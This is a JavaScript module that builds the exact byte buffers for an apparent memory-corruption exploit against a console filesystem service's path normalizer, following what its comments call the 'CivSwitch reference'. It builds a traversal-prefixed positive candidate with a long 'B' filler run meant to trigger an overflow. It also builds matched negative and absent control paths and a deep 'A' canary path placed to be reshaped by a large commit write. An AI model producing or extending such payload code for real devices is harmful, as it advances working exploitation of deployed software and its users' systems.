'use strict';

// Exact app-side path bytes for a bounded Balatro first-X comparison. The
// nested valid-parent prefix and 0x700 suffix placement carry the CivSwitch
// reference's overflow trigger: the positive candidate uses one unbroken
// 'B' filler component (>255 chars) in place of '/', while the negative and
// absent candidates keep the '/' filler. No path is staged or sent here.
const {createHash} = require('node:crypto');
const path = require('node:path');
const profile = require('./sdk-profile.v1.0.1f.json');
const {paths} = require('./marker-path-control.cjs');
const {descriptorInput} = require('./fs-attempt-packets.cjs');

const DESCRIPTOR_BYTES = 0x800;
const TERMINATOR_OFFSET = DESCRIPTOR_BYTES - 1;
const CANDIDATE_OFFSET = 0x700;
const HYPOTHESIZED_NORMALIZER_BYTES = 0x301;
// The CMIF GetEntryType single descriptor is hard-capped at 0x800 (a 0x2440
// descriptor is rejected at the transport level), so the Civ7-shaped positive
// candidate is bounded to 0x800 and the marker offset is searchable within it.
const POSITIVE_DESCRIPTOR_BYTES = 0x800;
const POSITIVE_CANDIDATE_OFFSET =
  Number.parseInt(process.env.BALATRO_POSITIVE_OFFSET || '0x700', 16);
const POSITIVE_TERMINATOR_OFFSET = POSITIVE_DESCRIPTOR_BYTES - 1;

function check(condition, reason) {
  if (!condition) throw Error(`Balatro first-X input: ${reason}`);
}

function sha(bytes) {
  return createHash('sha256').update(bytes).digest('hex');
}

function slashPadded(ownedPath) {
  check(typeof ownedPath === 'string' && ownedPath.startsWith('/') &&
    Buffer.byteLength(ownedPath, 'ascii') < HYPOTHESIZED_NORMALIZER_BYTES &&
    !ownedPath.includes('\\') && !ownedPath.includes('\0'),
  'owned direct path is outside the bounded descriptor');
  const bytes = Buffer.alloc(DESCRIPTOR_BYTES, '/');
  bytes.write(ownedPath, TERMINATOR_OFFSET - Buffer.byteLength(ownedPath),
    'ascii');
  bytes[TERMINATOR_OFFSET] = 0;
  check(path.posix.normalize(bytes.toString('ascii', 0,
    TERMINATOR_OFFSET)) === ownedPath,
  'slash-padded control does not resolve to its owned path');
  return bytes;
}

function candidate(prefix, suffix, fillByte = 0x2f) {
  check(typeof prefix === 'string' && prefix.startsWith('/') &&
    typeof suffix === 'string' && suffix.startsWith('/') &&
    Buffer.byteLength(prefix) < CANDIDATE_OFFSET &&
    CANDIDATE_OFFSET > HYPOTHESIZED_NORMALIZER_BYTES &&
    CANDIDATE_OFFSET + Buffer.byteLength(suffix) < TERMINATOR_OFFSET &&
    Number.isInteger(fillByte) && fillByte > 0 && fillByte < 0x80,
  'nested parent prefix or selected suffix does not fit first X');
  const bytes = Buffer.alloc(DESCRIPTOR_BYTES, fillByte);
  bytes.write(prefix, 0, 'ascii');
  bytes.write(suffix, CANDIDATE_OFFSET, 'ascii');
  bytes[TERMINATOR_OFFSET] = 0;
  check(bytes.subarray(0, Buffer.byteLength(prefix)).toString('ascii') ===
      prefix &&
    !bytes.subarray(0, TERMINATOR_OFFSET).includes(0) &&
    bytes.subarray(CANDIDATE_OFFSET,
      CANDIDATE_OFFSET + Buffer.byteLength(suffix)).toString('ascii') ===
      suffix &&
    bytes.subarray(Buffer.byteLength(prefix), CANDIDATE_OFFSET)
      .every(byte => byte === fillByte),
  'first-X candidate prefix, target, or terminator changed');
  return bytes;
}

// CivSwitch reference positive shape: a single unbroken 'B' component from
// the '/..\' prefix up to markerOffset, the owned target at markerOffset, '/'
// fill after the target, and a NUL terminator at the very end. The ~9020-byte
// 'B' run is the Path::Normalize overflow trigger; the descriptor is bounded
// by POSITIVE_DESCRIPTOR_BYTES and staged to the dedicated positive path buffer.
function largePositiveCandidate(prefix, suffix, size, markerOffset) {
  check(typeof prefix === 'string' && prefix.startsWith('/') &&
    prefix.includes('\\') && !prefix.includes('\0') &&
    Buffer.byteLength(prefix) < markerOffset &&
    typeof suffix === 'string' && suffix.startsWith('/') &&
    !suffix.includes('\0') &&
    Number.isInteger(size) && size > markerOffset &&
    markerOffset + Buffer.byteLength(suffix) < size - 1 &&
    size <= 0x3000,
  'large positive prefix, target, or size is outside the bounded descriptor');
  const bytes = Buffer.alloc(size, 0x42);
  bytes.write(prefix, 0, 'ascii');
  bytes.write(suffix, markerOffset, 'ascii');
  bytes.fill('/', markerOffset + Buffer.byteLength(suffix), size - 1);
  bytes[size - 1] = 0;
  check(bytes.subarray(0, Buffer.byteLength(prefix)).toString('ascii') ===
      prefix &&
    !bytes.subarray(0, size - 1).includes(0) &&
    bytes.subarray(markerOffset, markerOffset + Buffer.byteLength(suffix))
      .toString('ascii') === suffix &&
    bytes.subarray(Buffer.byteLength(prefix), markerOffset)
      .every(byte => byte === 0x42) &&
    bytes.subarray(markerOffset + Buffer.byteLength(suffix), size - 1)
      .every(byte => byte === 0x2f),
  'large positive candidate prefix, target, filler, or terminator changed');
  return bytes;
}

function buildGapFirstXInput({preflight}) {
  const owner = preflight?.arenaNonce;
  const nonce = preflight?.markerNonce;
  check(preflight?.gameProfile === profile.gameProfile &&
    /^[0-9a-f]{16}$/.test(owner || '') &&
    /^[0-9a-f]{16}$/.test(nonce || '') && owner !== nonce &&
    preflight.markerHitVerified === false &&
    preflight.fsStageVerified === false &&
    preflight.exactAllocationBytes === null,
  'fresh pinned owner without an FS claim is required');
  const owned = paths(nonce);
  const scratchRoot = `/bal-gap-${owner}`;
  const selectedDirectory = `${scratchRoot}/selected`;
  const absentDirectory = `${scratchRoot}/absent__`;
  // Civ7-shaped deep canary: a nested 32-'A' directory chain terminated by a
  // 24-'A' file, padded to ~0x5a0 bytes so its directory entry sits in the
  // reserved gap that the 8 MiB commit write reshapes (flipping type 1 -> 0).
  const canaryComponent = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
  const canaryFileComponent = 'AAAAAAAAAAAAAAAAAAAAAAAA';
  const canaryDirectory = `${scratchRoot}/canary`;
  const canaryFile = `${canaryDirectory}` +
    `${('/' + canaryComponent).repeat(42)}/${canaryFileComponent}`;
  const forwardPrefix = `${selectedDirectory}/../../`;
  const backslashPrefix = `${selectedDirectory}/..\\../`;
  const rootRelativePrefix = '/..\\';
  check(selectedDirectory.length === absentDirectory.length &&
    selectedDirectory.length < HYPOTHESIZED_NORMALIZER_BYTES &&
    path.posix.dirname(selectedDirectory) === scratchRoot &&
    path.posix.dirname(absentDirectory) === scratchRoot &&
    forwardPrefix.length === backslashPrefix.length &&
    [...forwardPrefix].filter((char, index) =>
      char !== backslashPrefix[index]).length === 1 &&
    path.posix.normalize(forwardPrefix + selectedDirectory) ===
      selectedDirectory &&
    path.posix.normalize(forwardPrefix + absentDirectory) ===
      absentDirectory,
  'matched selected and absent directories differ');
  const descriptors = Object.freeze({
    markerControl: descriptorInput(nonce, 'marker'),
    absentControl: descriptorInput(nonce, 'absent'),
    selectedDirectoryControl: slashPadded(selectedDirectory),
    absentDirectoryControl: slashPadded(absentDirectory),
    positiveCandidate: largePositiveCandidate(backslashPrefix,
      selectedDirectory, POSITIVE_DESCRIPTOR_BYTES, POSITIVE_CANDIDATE_OFFSET),
    negativeCandidate: candidate(forwardPrefix, selectedDirectory),
    absentCandidate: candidate(forwardPrefix, absentDirectory),
  });
  const changedSeparatorOffset = [...forwardPrefix].findIndex((char, index) =>
    char !== backslashPrefix[index]);
  check([descriptors.markerControl, descriptors.absentControl,
    descriptors.selectedDirectoryControl, descriptors.absentDirectoryControl,
    descriptors.negativeCandidate, descriptors.absentCandidate].every(bytes =>
    Buffer.isBuffer(bytes) && bytes.length === DESCRIPTOR_BYTES &&
    bytes[TERMINATOR_OFFSET] === 0) &&
    Buffer.isBuffer(descriptors.positiveCandidate) &&
    descriptors.positiveCandidate.length === POSITIVE_DESCRIPTOR_BYTES &&
    descriptors.positiveCandidate[POSITIVE_TERMINATOR_OFFSET] === 0 &&
    !descriptors.markerControl.equals(descriptors.absentControl) &&
    changedSeparatorOffset > 0 &&
    descriptors.positiveCandidate[changedSeparatorOffset] === 0x5c &&
    descriptors.negativeCandidate[changedSeparatorOffset] === 0x2f &&
    descriptors.positiveCandidate.subarray(Buffer.byteLength(backslashPrefix),
      POSITIVE_CANDIDATE_OFFSET).every(byte => byte === 0x42) &&
    descriptors.negativeCandidate.subarray(Buffer.byteLength(forwardPrefix),
      CANDIDATE_OFFSET).every(byte => byte === 0x2f) &&
    descriptors.absentCandidate.subarray(Buffer.byteLength(forwardPrefix),
      CANDIDATE_OFFSET).every(byte => byte === 0x2f),
  'first-X filler or separator bytes changed');
  const sha256 = Object.fromEntries(Object.entries(descriptors).map(
    ([name, bytes]) => [name, sha(bytes)]));
  return Object.freeze({mode: 'balatro-first-x-0x800-hypothesis',
    arenaNonce: owner, markerNonce: nonce,
    scratchRoot, selectedDirectory, absentDirectory,
    canaryDirectory, canaryFile, canaryComponent, canaryFileComponent,
    forwardPrefix, backslashPrefix, rootRelativePrefix,
    markerPath: owned.marker, absentPath: owned.absent,
    descriptorBytes: DESCRIPTOR_BYTES,
    terminatorOffset: TERMINATOR_OFFSET,
    candidateOffset: CANDIDATE_OFFSET,
    positiveDescriptorBytes: POSITIVE_DESCRIPTOR_BYTES,
    positiveCandidateOffset: POSITIVE_CANDIDATE_OFFSET,
    changedSeparatorOffset,
    hypothesizedNormalizerBytes: HYPOTHESIZED_NORMALIZER_BYTES,
    shortControls: Object.freeze({
      direct: Object.freeze({selected: selectedDirectory,
        absent: absentDirectory}),
      forward: Object.freeze({selected: forwardPrefix + selectedDirectory,
        absent: forwardPrefix + absentDirectory}),
      backslash: Object.freeze({selected: backslashPrefix + selectedDirectory,
        absent: backslashPrefix + absentDirectory}),
    }),
    descriptors, sha256,
    selectedDirectoryCreatedAndVerified: false,
    fsVictimAddress: null,
    exactPinAllocationBytes: null,
    directPathControlsVerified: false,
    positiveAttemptAllowed: false,
    fsSideMarkerReadbackVerified: false,
    markerHitVerified: false, fsStageVerified: false});
}

module.exports = {DESCRIPTOR_BYTES, TERMINATOR_OFFSET, CANDIDATE_OFFSET,
  HYPOTHESIZED_NORMALIZER_BYTES, POSITIVE_DESCRIPTOR_BYTES,
  POSITIVE_CANDIDATE_OFFSET, POSITIVE_TERMINATOR_OFFSET,
  slashPadded, candidate, largePositiveCandidate, buildGapFirstXInput};
